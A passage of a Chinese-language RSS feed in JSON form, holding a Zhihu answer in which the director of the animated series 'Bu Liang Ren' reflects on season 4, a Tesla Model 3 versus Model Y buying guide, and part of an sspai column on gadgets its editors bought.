href=\"https://www.zhihu.com/question/294492829\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>你在高中时听说过/做过什么轰动全校的事？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/0b9535451eb75736a512604e917ae787_l.jpg?source=8673f162\"><span>刘尔春，</span><span>苦逼民工</span>\n<a href=\"https://www.zhihu.com/question/319923069/answer/663510274\" hidden>阅读原文</a>\n</div>\n<div>\n<p>我班一对情侣私奔，一周后钱花完后回来了。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/319923069\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>《哈利·波特》中最惊艳你的一处设定是什么？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-1dc0bc942959634058f409ac16594f6c_l.jpg?source=8673f162\"><span>胡文浩，</span><span>恩···搞生态的</span>\n<a href=\"https://www.zhihu.com/question/340698884/answer/795235986\" hidden>阅读原文</a>\n</div>\n<div>\n<p>生怕哈利学习不好，伏地魔总是到期末才搞事</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/340698884\">阅读原文<span></span></a></div>\n</div>\n","link":"https://daily.zhihu.com/story/9737878"},{"title":"如何评价《画江湖之不良人》第四季第十三集？","date":"2021-07-08 11:30:08","description":"\n<p>大家好，我是舒，播又来。今天最后一篇，至此12篇知乎的任务完成。</p>\n<p><br></p>\n<p>先闲聊两句吧！从2015年参与不良人2编剧至今已有六年，做导演这还是头一回。在紧紧巴巴的时间里磕磕碰碰，总算是完成了不良人4的所有内容，虽遗憾颇多，但只能到此为止。</p>\n<p>六年了，今天也该告别了。</p>\n<p><br></p>\n<p>五、六季的不良人中，我将不会再担任编剧与导演，只是负责与剧本监督一起敲定剧情走向与结局等“大方向”类的内容，剧本层面则由我们的编剧李皖青与李佳炫主笔，再加上导演李帅帅，往后是李家人的天下啦！</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-a4037b691bc682d6db7f3490fd7bc25a_720w.jpeg?rss\" data-caption=\"上：李帅帅        左下：李皖青        右下：李佳炫\" data-size=\"normal\" data-rawwidth=\"4032\" data-rawheight=\"4030\" data-watermark=\"watermark\" data-original-src=\"v2-a4037b691bc682d6db7f3490fd7bc25a\" data-watermark-src=\"v2-f26bc87029df41a644e2460c33668895\" data-private-watermark-src=\"v2-6be3457b067d375f7c8c653a74af8fd2\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-b7a926e0fbe0c88a117921a955afeaa6_720w.jpeg?rss\" data-caption=\"剧本监督     左：于奥       右：周铁男\" data-size=\"normal\" data-rawwidth=\"3648\" data-rawheight=\"5472\" data-watermark=\"watermark\" data-original-src=\"v2-b7a926e0fbe0c88a117921a955afeaa6\" data-watermark-src=\"v2-56391ed6bec2eedd6e4ebdd131d09bbc\" data-private-watermark-src=\"v2-281ea9d913d7ab9309975e850d1ea82c\"></p>\n<p>虽不再参与制作，但在闲暇时间我和李导偶尔也会交流一些后续内容，还参与了第五季OP画面的构思，我记得那天跟李导听着片头曲聊片头的时候还是很开心的！对了，在这里还要感谢一下不良人第四季的镜头导演由于13集片尾没有放入他们的照片，在这里补上！</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-9dc441c6eb117fe42df592c9af4c8932_720w.jpeg?rss\" data-caption=\"左上：白玥萌        下：张翔       右上：任伟杰        上面的两位不愿意露脸\" data-size=\"normal\" data-rawwidth=\"3024\" data-rawheight=\"4030\" data-watermark=\"watermark\" data-original-src=\"v2-9dc441c6eb117fe42df592c9af4c8932\" data-watermark-src=\"v2-c01cdc7acfdb8e8fb99c20de4ab0b67d\" data-private-watermark-src=\"v2-3c074082baf3a5672f0ea33631f202f2\"></p>\n<p> 感谢作曲丁培峰老师和作词海雷老师的付出，创作出了歌曲《蛊》。之前听过他们合作的那首《不染》就很惊艳。在创作这首歌时是先词后曲的，海雷老师一共出了三版词，前两版的词也十分成熟，只是因为我个人喜好因而并未采纳，最终《蛊》的词出来一下子感觉就对了，十分简单明了的歌词，毫不矫情。最终这版词也没有做任何修改，作曲丁老师那边我更是完全没有操过任何心。毕竟有两位大神出马，我就在家乖乖等着发歌了。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-be0dd0bbea8d7fbfa53ec8e0a44b01c9_720w.jpeg?rss\" data-caption=\"三个版本的歌词\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"watermark\" data-original-src=\"v2-be0dd0bbea8d7fbfa53ec8e0a44b01c9\" data-watermark-src=\"v2-4be08e917b3bf31f80d227e5aa0ed2d6\" data-private-watermark-src=\"v2-fb3b1d9425259e057463cb18e84cacd1\"></p>\n<p>还有一个遗憾还是想说一下，最后蚩梦母亲的镜头被不可抗力了，因而替换成了一只手，由于做的仓促效果并不理想，如果有剪辑帝的话，可以尝试把这个镜头放到正片里的位置试试看，效果会完全不同。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a89cb3356e7734c62baa0f0246239faa_720w.jpeg?rss\" data-caption=\"预告片中这个镜头我认为效果比较好，但正片中无法出现\" data-size=\"normal\" data-rawwidth=\"2337\" data-rawheight=\"1080\" data-watermark=\"watermark\" data-original-src=\"v2-a89cb3356e7734c62baa0f0246239faa\" data-watermark-src=\"v2-571d681a2c090d0485ad76bbd4bcf958\" data-private-watermark-src=\"v2-d56d67186bf32f88b640a434ba8ff157\"></p>\n<p>第四季最初叫做娆（苗）疆篇，因此会有许多观众认为此剧与不良人并无太大关系。大家不必担心，从第五季开始剧情将会回归主线内容。之前关于蚩梦与尤川的问题没有回复大家，只是因为不想做过多的引导，影响大家的观感。网上各种瞎传也只能当没看见，好家伙星雪凡轩蚩尤六个人死了个遍，连我妈都问我蚩梦是不是要死了……往后还是以看正剧为准吧，包括片头的内容也别轻易相信，蒙眼等细节只是跟“五感”有关而已。当然，经历了这么多，最让人灰心的还是在网络上出现了自己人的“图透”，不过都过去了，就不多提了。</p>\n<p>本季的创作初衷主要是想填一下曾经给娆疆那边挖过的坑，还要彻底解决蚩梦对李星云的爱恋之情。</p>\n<p>其实本季我们大可以避开这些“雷区”，不写、少写情感戏，或按照粉丝的想法组CP，将许多人物的曾经不了了之。但最后我们还是选择了做一件自己不后悔的事儿。包括今天的更新，用官方口径说“绝对安全”的话没意思，既然说了，就说点儿真正想说的，也能给关心不良人的观众一个答案。我们天津有个相声大师经常会说，观众就是衣食父母嘛，因此无论是黑是吹或是随便看看，只要大家是我们的观众，我们都是会重视的，谢谢你们的观看。</p>\n<p>作为主创，我认为在第二季中蚩梦与李星云所发生的一切，不能因为第三季出现了高热度的角色就当做不存在了，就像无论谁出现也不会影响李星云对姬如雪的情感一样，毕竟不良人系列是一个连续的故事。部分粉丝们过滤掉不利于自己的内容很正常，因为观众就应该是爱怎么看剧就怎么看剧，但我们不能这么做。</p>\n<p>蚩梦对于李星云的情感并不属于一见钟情，这与尤川对于蚩梦的情感设定比较相似——都是由于长时间接触而慢慢产生情感。自第二季“进房间两次”事件后，蚩梦虽以“小”自居但仍不甘愿，直到经历漠北与天山后才真对李星云正动情，且一往而深。关于天山圣女引出情蛊的结局早在第二季创作蚩梦的角色时就已想基本好，因此我们从没考虑过李星云有其他情感线的可能，但蚩梦的CP线确是在尤川出现后考虑过更换的，不过最后还是放弃了——因为没有合适的篇幅来解决她对李星云的情感。如果让蚩梦在心里有李星云的情况下喜欢其他人，这个角色将彻底崩掉，且不说李星云在场时他们的戏如何行进，新观众们很有可能对这个不纯粹的女孩再也喜欢不起来，到时候里外不是人的局面会更难收场。可如果用分量不够的方式解决她对李星云的情感，又会觉得第二季的剧情太儿戏。蚩梦对于李星云的付出有目共睹，她对李星云会是对“哥哥、亲人”的情感吗？或者她自己也不知道什么是喜欢吗？我只能说这种强行的话我说不出来。第二季的故事网上都能看，曾经“某运营人员”放出“哥哥、亲人、不知道啥是喜欢”这种话来引导观众，我认为是不负责任的做法，是不尊重观众与创作者的做法，也有可能是趁着尤川比较火出现的急功近利的做法。</p>\n<p>最终，我们决定在第四季终结这段许多人看来是“错误”的情感，给予蚩梦未来更多的可能性。“如果能不死，就不再喜欢了。”</p>\n<p>我一直觉得无论是做错了事，亦或是爱错了人，都该有相应的果报。也许现在这个时代许多人更愿意追求个好结果，但我还是会认为过程同样重要，没有好结果并不代表过程没有意义。我其实很不想把注定没有结果的情感说成是错误的情感，但也没办法，人在江湖，总是要跟着规矩活的。</p>\n<p>因此，蚩梦单纯而自由的人生观造成了她在情感上有这样的苦果，也是对她喜欢上李星云这件事的报，而我唏嘘这样的结局，是对我们写下了这段情感的报。</p>\n<p>有些情感是一张字条。是既见君子，云胡不喜。</p>\n<p>有些情感是一次争吵。是她有什么好，我哪里及不上她，你老是想着她，老是忘不了她。</p>\n<p>有些情感是一句告别。是身在波斯，日日祝公子福体康宁，诸事顺遂。</p>\n<p>可无论过程多苦，不管是尤川对蚩梦，蚩梦对老李，还是老李对姬如雪，我想只要是正向而单纯的情感，就应该是值得人去在意的。直到最后的最后，再了断过去，重新开始。</p>\n<p><br></p>\n<p>一个故事播出来，这个故事里的人物和剧情在某种意义上就不属于主创的了，而是属于观众的。我不清楚最终尤川留在十二峒修行，蚩梦统领万毒窟是不是个好结局，但他们之后各自都有更多的空间和可能了。不过以后的可能是什么，就得看以后的编剧啦！而且至少写作时不会再因一些“历史遗留”问题而束手束脚了，我也希望他们再出现时，都成长为可以独当一面的人物吧！<i>（毕竟尤川放走的蝴蝶只是盘旋，并没有飞走。靠这个我都说了，本来不想说的）</i></p>\n<p>关于侯卿在本季的节点，我们并没有交待，请大家继续往下看吧。</p>\n<p>下一季回到了老李和雪儿的主场，之后他们是如何携手前行的，就请大家拭目以待。<i>（我也想看，先在这里催个更……赶紧播…然后本集片尾放的是第五季的预告，不是什么大电影！！据我所知，动画大电影很有可能会有的！）</i></p>\n<p>回顾画江湖系列，之前若森数字的每一个导演都与团队拼劲全力，不断的试错、绕路、摸索着前进的方向。无论未来的路平摊还是颠簸，我都相信，若森有这样一群认真的人，一定会变得越来越强大。</p>\n<p><br></p>\n<p>若森加油，国漫加油！886！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/cheng-zi-duo-62?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">橙子多</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/469383435/answer/1985890753?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">238 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/467001152?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待《画江湖之不良人》第四季第11集？</a><br><a href=\"http://www.zhihu.com/question/465504311?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《画江湖之不良人》第四季第 11 集？</a><br>\n","link":"http://www.zhihu.com/question/469383435/answer/1985890753?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"27 万的 Model Y 来了，现在买特斯拉该怎么选","date":"2021-07-08 10:00:00","description":"\n<p>悄悄地，特斯拉又上新了，27.6 万的 Model Y，应该是目前最具竞争力的电动 SUV，这样一来，Model 3 和 Model Y 一共有五个车型，很多准车主可能都在困惑，自己应该怎么选，作为开过两款车，在西部跑了一万公里的过来人，整理一下思路，给大家提供一点个人建议。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/article/ec13a72d38143ff4b96ece53d69b8dc1\"><figcaption>Model Y 和 Model 3 的侧面对比</figcaption></figure><p>首先说说 Model 3 和 Model Y 的定位区别和驾驶差异点，刚好这两款车都我都有足够的使用场景和经验，分析起来相对比较全面。Model S 和 Model X 属于豪华车，不在本次讨论范围。</p>\n<h2>Model 3 犀利的小轿跑</h2>\n<p>虽然 Model Y 上市之后，Model 3 有点失宠过气的感觉，但开过一年的小 3，我仍然认为它是一款经典的、优秀的家用小轿车。首先是外观设计上，更和谐而灵动，相比之下，基于 3 改胖了的 Model Y 就略显臃肿，Y 毕竟不像 Model X 是一个全新设计的 SUV 车型，所以在整体外观上是不如 3 匀称好看的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/article/c534a4aabfa7a33860ece5b98c9908bd\"><figcaption>匀称好看的整体线条</figcaption></figure><p>开起来的感觉也不一样，Model 3 接近轿跑车型，坐姿很低，有很强的人车合一感，同时车身小巧，更容易把控距离，方向盘也更精准，开起来有种莫名的爽感。而 Y 是没有这种感觉的，虽然它们百公里加速几乎一样，但由于 Y 的坐姿高，车身大，所以驾驭感要差一截，没法跟 3 直接比较。所以，你是更在意日常驾驭感，还是更需要空间实用性，是选择两款车的关键。</p>\n<h2>Model Y 多功能旅行车</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/cb5eccfc8b244abc6c988c84f3032dc8.png\"><figcaption>跟 Model 3 一起抵达珠穆朗玛峰</figcaption></figure><p>既然 Model Y 没有那么好的驾驭感，那它的优点是什么呢？当然是空间，虽然都是五座配置，但 Y 的后排要宽阔很多，掀背尾箱也大很多，特别是座椅高度提升，完全可以伸直腿，进入半躺状态。而 Model 3 后排座椅矮，会有点半蜷缩的感觉，跑稍远的路程，乘坐体验会比较累，身材高大的人更明显。所以如果你后排需要经常载人，不管是家人还是朋友，Model Y 是最佳选择。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/5a410ca7113c6bff571e60de04dc7516.png\"><figcaption>可以在 Y 的后排完成轻办公</figcaption></figure><p>载物空间也更多，特别是加装旅行箱之后，基本可以把露营远行的装备一直带着，随时可以去郊外 Happy，虽然 Model 3 也能装车顶行李箱，但看起来会很违和，不适合长期挂载，Model Y 车型就没有这个问题，同时，加上行李箱的高度不超过 1.9 米，你仍然可以穿梭在任何城市停车场和隧道，没有限高的麻烦。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/3b9862f134a8f111ec03de4f5c55198e.png\"><figcaption>享受安静的户外时光。</figcaption></figure><h2>续航里程和性能差别</h2>\n<p>标准续航版 Model 3 官网续航 468 公里，实际表显续航应该是 420 公里，这个续航距离在 150 公里范围内的城际往返，会略有焦虑，但是现在的充电桩铺设率已经相当高，在高速或者城区补一次电就没有问题。所以，要了解你周围城市的充电网络情况，以及你日常的出行距离和计划来判断。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/779228494e597aeb3d97c39e36b18239.png\"><figcaption>高速路充电桩普及很快</figcaption></figure><p>高性能版的 Model 3 官网续航 605 公里，实际表显是 480 公里左右，续航并没有长很多，加速从普通的百公里 5.6 秒提升到 3.3 秒，我也开过几次性能版，说实话，在常规路况下，确实感受不到明显的差异，如果去专业赛道，开启赛道模式，应该会更加过瘾。所以，要不要多花 9 万买性能版，完全是看你的预算能力和个人偏好。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/56b4cddc43dbc13f256a4c19e04ad896.jpeg\"></figure><p>Model Y 现在有三款了，新上线的标准续航版，官网标称 525 公里，表显续航应该是 420 公里左右 ，应对城市周边出行基本够用。那它跟长续航版的主要差别就是四驱能力，四驱到底有没有用呢？跑过川藏和青藏就知道有用，不管是雨雪还是泥泞，开启越野模式，开起来非常稳，大大增加安全性和脱困能力，但 Model Y 适合专门玩越野吗？并不行，因为底盘不够高，没有专业保护设备，没法通过巨石或深坑。所以长续航的意义，更多是提升一定的性能，增加特殊路况下的安全稳定性，比标准版增加了 100 公里的实际续航，那么相差 7 万的价格，该怎么选择，你得自己评估一下。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/b2a21a03cd5edcc28aea5d3987ede6f7.png\"><figcaption>比 3 高一点的底盘，就有更好的通过性</figcaption></figure><p>至于性能版的 Model Y，我本身不是性能控，就想不到需求点了，如果想玩赛道，可以选性能版 Model 3，还便宜 3.8 万元，那它的受众应该是性能控，同时想兼具空间的用户，但受限于 Y 的车身尺寸，这个性能感能体现出多少？我这里先打一个问号。</p>\n<p>用一个表格来呈现，也许会更清晰一些。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/b69a77e828637cfdd698dd55f6b773c8.png\"></figure><p>这里要说明一下，高级内饰，包括 14 喇叭音响，沉浸音效，方向盘加热等常用，标准续航的 Model 3 是普通音响配置或缺失一些功能，具体可以去官方查询，但标准续航的 Model Y 是标配高级内饰的。竞速套件包括专门的轮毂和轮胎，刹车卡钳，碳纤维尾翼，铝合金踏板等等，其实这些配件单买都不便宜，相对来说附加值高了不少。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/f64dae815194723e82f069f8f9c2be13.png\"></figure><p>所以综合来看，选车首先要明确自己的用车需求，用车人数，用车场景，并不是听别人讲哪款便宜，哪款更有性价比，就盲目跟风，我就从一些人群或用车场景来分类说说。</p>\n<h2>单身青年或二人世界</h2>\n<p>如果短期内没有生娃或者跟父母一起生活的打算，一个人或二人世界，依然推荐选择 Model 3，价格实惠，好开好停，偶尔出去玩玩问题也不大，超过 400 公里的续航，就算两个人想跑趟拉萨也是可以的，只要规划好充电路线就行，很多车主都已经亲自验证过了。如果俩人都有驾照，小车也对女生也更友好。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/a42bb03fecb77bd33d3747632da7b812.png\"></figure><p>当然，如果是二人世界，但特别偏爱旅行，或者是自由职业者，推荐选择 Model Y，更大的空间可以带更多旅行物品，放倒后排座椅就是最舒服的户外帐篷。行李架上可以自己增加更多需求的旅行装备，包括行李箱，车边帐，车顶自行车架子等等。详细的可以参考我之前 <a href=\"https://sspai.com/post/66458\" target=\"_blank\">去川藏的折腾文章</a> 。</p>\n<h2>奶爸或五口之家</h2>\n<p>经常带孩子或偶尔带父母出行，就选 Model Y，它不仅能承载五人需求，还有足够的行李空间。日常也能有足够的车内空间，防止小孩吵架。周末也可以带着一家去郊游和露营一下，调节生活节奏。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/162c6e41eb3ba946b878958bbd80df70.png\"></figure><p>当然，如果是兼顾公司用车，也推荐 Model Y，不管是临时接待客户，带同事团建，还是变身拉货，都能很好的完成任务。所谓跨界多功能也就是这个意思。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/71d443e1e5175576bd1eb169a1c047d0.png\"></figure><p>最后说两句吧，车是交通工具，也是一种生活方式，特别是智能汽车时代的到来，它将给我们带来更多的空间和时间，理性选择，善用价值，才是选车和用车的根本所在。反正我对自己的长续航 Model Y 还是挺满意的，也不会因为标准续航版更便宜而感到后悔，毕竟，它可能是第一个抵达珠峰脚下的 Model Y，属于自己的体验和记忆是没法估价的。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更多的新玩意 🆒</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/?spm=a230r.7195193.1997079397.2.2ddc7e0bPqKQHc\">少数派 sspai 官方店铺 </a>🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67607"},{"title":"新玩意 070｜少数派的编辑们最近买了啥？","date":"2021-07-08 09:29:00","description":"\n<h4>关于栏目</h4>\n<p>很多读者都会好奇少数派的编辑们到底平时都「买了啥」。我们希望通过「编辑部的新玩意」介绍编辑部成员们最近在用的新奇产品，让他们自己来谈谈这些新玩意的使用体验究竟如何。</p>\n<hr>\n<h2>@Clyde：Spinfit CP360</h2>\n<ul>\n<li>入手渠道：京东旗舰店</li>\n<li>价格：79 元</li>\n</ul>\n<p>WF-1000XM4 今年用了新耳塞材料，像海绵那样具有一定的形变能力、但又比一般的海绵材质要硬上那么一点。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/67466\" target=\"_blank\"> 手中的 Bose 还想留着，但它已经没那么香了：WF-1000XM4 上手体验</a></p>\n<p>这种新材质带来了不俗的密闭性，但也带来了一点小问题——比如更适合我耳道的耳塞尺寸其实在默认的小号和中号之间，那我显然应该选择中号来获取更好的佩戴稳定性和密闭性，但中号耳塞因为较硬的材质，塞进耳道、膨胀变形后总会给人一种撑得有点胀的感觉，长期佩戴还挺难受的。所以很快我就根据上文评论区建议入手了声必飞的 CP360。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/3cff255e3ceb81ba4f8edb751838d293.png\"><figcaption>CP360（中）与索尼默认的 M（左）、S（右）尺寸对比</figcaption></figure><p>这是我第一次选择出厂默认之外的第三方耳塞，体验还行。选购前根据商品详情页的介绍仔细量了量 WF-1000XM4 作为对比，最后成功选到了尺寸完美介于 WF-1000XM4 默认中、小号耳塞之间的 S/SS 尺寸套装；耳塞本体为亲肤硅胶材质，弹性不错，哪怕选择比耳道略大一点的尺寸进行佩戴不会觉得胀，一口气听上一两个小时歌自然也不是问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/cf109c8acc88dba0b57c667bcc34a195.png\"></figure><p>但为了帮大家避坑，结论我还是得加粗放在这里：<strong>Spinfit CP360 并不适合 WF-1000XM4</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/eb32677e48e45c2f8aa56fc82f2c77b5.png\"></figure><p>倒不是说耳塞本身有什么问题，我对耳塞很满意，只是我在前期测量的时候忽略了轴径 —— 对 WF-1000XM4 来说 CP360 的轴径有些小了，套上去总给人一种在折磨耳塞的感觉。所以建议有同样需求的朋友可以仔细测量，试试轴径更大一点的 CP100 或者 CP145。</p>\n<h2>@flypig：PITAKA MagEZStand iPad 支架</h2>\n<ul>\n<li>入手渠道：<a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/26z1232u1t8m8\" target=\"_blank\">少数派商店</a>\n</li>\n<li>价格：支架 579 元 + 壳 489 元</li>\n</ul>\n<p>这个东西最有意思的一点，它可以把我的 iPad Pro 像一个显示器一样立在那里，特别是拿着 iPad Pro 看视频的时候，如果是 Mini LED 版本的 iPad Pro，那体验就更上一层楼，比起某些显示器在显示上更为优秀。同时这个底座也是一个无线充电板，很贴心，你可以把手机或者 AirPods Pro 的充电盒放在这里充电。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/568aa5f1d829971d4923465fa784d8fb\"><figcaption>无视我的 MagSafe 充电线，只是懒得给底座接线</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/7a0a83f08103da71a77f76058c0fa00a.jpeg\"><figcaption>还是官方示意图直观一些</figcaption></figure><p>另外，支架顶端和 iPad Pro 连接的部分是可以全向旋转的，就是竖着、横着都可以，这个设计就很贴心。支架手感做得也还不错，俯仰角也可以调整，但有一点遗憾是不能像很多显示器支架一样上下移动。</p>\n<p>要是需要键盘和触摸板配合使用的话，就要多费点时间去配置一套输入设备，这和直接放在 Magic Keyboard 上即放即用相比，还是麻烦了一些。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/76ea276347db5e557377cd23a0535b20.gif\"></figure><p>这个凯芙拉的 iPad 壳装配的时候还挺难，但是挺轻薄，甚至可以和 Magic Keyboard 的兼容，凯芙拉本身低调又实用的设计应该会被很多科技爱好者喜欢。</p>\n<h2>@北鸮：NCR-80 R1 复古机械键盘套件</h2>\n<ul>\n<li>入手渠道：淘宝预购</li>\n<li>价格：622 元（热插拔 PCB 套装 + 碳纤维定位板）</li>\n</ul>\n<p>我一度对 Cherry 的 3000 系列非常着迷，经典的宽边框外观对我这种小时候玩过几天「小霸王」的人来说也算是有了点怀旧味道。尽管 Cherry 现在还在卖这一系列中的 G80-3000 和 G80-3494，但严格说来，这款「复古」键盘是真的老掉牙了。我在 <a href=\"https://sspai.com/post/64972\" target=\"_blank\">机械键盘选购指南 </a>一文中就说过，如果你想体验 3000 系列，不如直接淘二手，不然对于已经习惯了紧凑桌面、多功能快捷键的键盘用户来说，用这些老键盘就是高价的折磨。</p>\n<p>幸运的是，总有人跟我有类似的想法，一些客制化大神做了适配老外壳的多功能 PCB，为经典外观带来新生；还有一些就像我参团的这个套件一样，直接开了一个新模具，把这种注塑大额头风格带给了它们不曾去过的 80% 配列。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/abb8973b3c35272bcb383a617ade0ac5.jpeg\"></figure><p>NCR-80 套件模拟了 Cherry 为 NCR 代工生产的 NCR G81-3077 SAU，但是砍掉了小键盘和三颗较少用的功能键，保留了最经典的标志、灯贴和工业灰的大门牙上盖。整体结构基本保持了 G81-3077 原本的设计，把卡扣等易碎部件换成了简单一些的螺丝固定。焊接版 PCB 支持多种配列，但我图省事儿，买了热插拔版本，还多买了一块碳纤维的定位板，丧失了一部分可玩性。购买焊接版的玩家是可以把原厂无钢那种柔软的手感也一并还原的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/155b01ab46fcbbf079cb9208ae644ed1.jpeg\"></figure><p>老键盘的神韵只有注塑套件才能完美传达，但注塑的客制化键盘比较稀少，毕竟注塑开模的成本还是很高的，如果后续出货量不够大很容易就会亏。我还是非常佩服这个作者的，不光开了模具，还做了 NCR 的铭牌和背后的标识胶贴，连盒子都尽可能做了还原。作者也说后续还会有蓝牙双模、无门牙和小门牙支持等一系列升级，也会持续推出 R2 R3 等团购，复刻其他经典颜色。不过目前的单模版本已经足够我的日常使用了，80% 配列、USB-C 接口、QMK 固件这些该有的都有了，接下来只要配一套经典的灰白键帽，再弄条打卷的电话线就齐活了。</p>\n<h2>@Clyde：九阳 Line Friends 电烤箱</h2>\n<ul>\n<li>入手渠道：京东旗舰店</li>\n<li>价格：299 元</li>\n</ul>\n<p>买东西之前还是要多看看少数派的文章，这是这次购买九阳 Line Friends 电烤箱最大的心得体会。</p>\n<p>外观上这的确是一款很可爱的烤箱，Line Friends 的可爱加成摆在那儿，黄黄的机身、浅黄的旋钮、萌萌的鸭子，哪个少女不想买一个放家里吃灰呢？烤箱的单层玻璃门黝黑锃亮，烤制过程中除了能够看见里面的鸡腿也能看见外面流口水的自己。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/08/cc06523960b55d3e8b4277ef7f25dd37.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/08/c398c0a8d524fd11a2272cc05b06b3f4.png\" alt=\"\"></figure><p>往参数上说这款烤箱就更加「可爱」了。</p>\n<p>主要发热方式是一根石英管，加热效果实测看缘分，升温倒是挺快，但按照食谱上的时间进行烤制多半烤不好，比如说好的 25 分钟蛋挞我就用了 40 分钟才做出来，也不知道是温度没达标还是其他原因。</p>\n<p>说起温度，这款烤箱的主要操作都放在烤箱正面的两个旋钮上，一个是 100~200 摄氏度调温、另一个则是 0~60 分钟定时，高情商说法是两个旋钮都支持无级调节，我这种低情商用户则表示有点拿捏不准非整数的定时设置——更要命的是定时旋钮还不允许往回拨。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/08/451d7752a8ee0ee53c5b657e8a65ac6e.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/08/a6440f956c4aab79e4891c1f081c5d53.png\" alt=\"\"></figure><p>但好在还是能烤出来东西，毕竟咱水平有限，要求自然也高不到哪里去。如果你只是想入门，偶尔烤点小东西，比我便宜的价格购入这款烤箱没毛病；如果你对烤箱和烹饪都有着一定的要求，还是建议读一读这两篇我后悔没有先熟读的文章：</p>\n<ul>\n<li><a href=\"https://sspai.com/post/60891\" target=\"_blank\">收获美味与成就感：一份烤箱入门指南</a></li>\n<li><a href=\"https://sspai.com/post/60218\" target=\"_blank\">烘焙入门：从选一个合适的烤箱到烤好第一个红薯</a></li>\n</ul>\n<h2>@张奕源Nick：thecoopidea CARGO 02 无线耳机</h2>\n<ul>\n<li>入手渠道：工友赠送</li>\n<li>参考价格：<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=650639199693\" target=\"_blank\">299 元</a>\n</li>\n</ul>\n<p>本 TWS 大户又弄新耳机了，这次是工友问路送我的 thecoopidea CARGO 02。</p>\n<p>在之前我派与荔枝播客联合推出的在线直播中，我和问路在聊「有趣的数码产品」这个话题时，我第一个就推荐了它。作为一款主打设计和颜值的产品，CARGO 2 在我看到它的第一眼时就吸引到了我，可谓顺利完成了「靠脸吃饭」的任务。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/article/c9a22009bbd45c9241c7c42a1a7b1346\"></figure><p>具体地说，CARGO 02 吸引我的地方在于其全金属材质和军工风外形，在众 TWS 耳机都在拼命把自己做得白白胖胖、干净简洁的大环境下，这种厚重的金属风反而显得特立独行。而且 CARGO 02 